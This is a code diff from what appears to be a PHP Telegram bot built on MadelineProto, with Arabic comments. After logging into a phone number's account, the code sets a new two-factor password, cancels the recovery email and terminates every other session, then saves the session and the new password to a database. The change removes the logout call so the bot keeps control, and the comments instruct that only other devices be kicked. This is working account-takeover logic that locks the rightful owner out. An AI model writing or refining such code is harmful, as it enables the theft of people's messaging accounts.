@@ -621,20 +621,21 @@ if ($message && !$callback) {
             $newPassword = bin2hex(random_bytes(8));
             
             // تغيير كلمة المرور
-            try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
-            
-            // إلغاء البريد الإلكتروني للاسترداد
-            try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
-            
-            // إنهاء الجلسات الأخرى
-            try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
-            
-            // تسجيل الخروج
-            try { $mad->logout(); } catch (Exception $e) {}
-            
-            $finalFile = SESSIONS_PATH . md5($phone) . '.madeline';
-            if (file_exists($tempFile)) rename($tempFile, $finalFile);
-            
+          
+try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
+
+// إلغاء البريد الإلكتروني للاسترداد
+try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
+
+// ✅ طرد الأجهزة الأخرى فقط (وليس تسجيل خروج البوت)
+try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
+
+// ❌ لا تستخدم logout() أبداً هنا
+// try { $mad->logout(); } catch (Exception $e) {}  <-- احذف هذا
+
+// ✅ فقط احفظ ملف الجلسة وخلاص
+$finalFile = SESSIONS_PATH . md5($phone) . '.madeline';
+if (file_exists($tempFile)) rename($tempFile, $finalFile);            
             $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")->execute([$phone, $session['country_code'], $finalFile, $newPassword]);
             $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
             
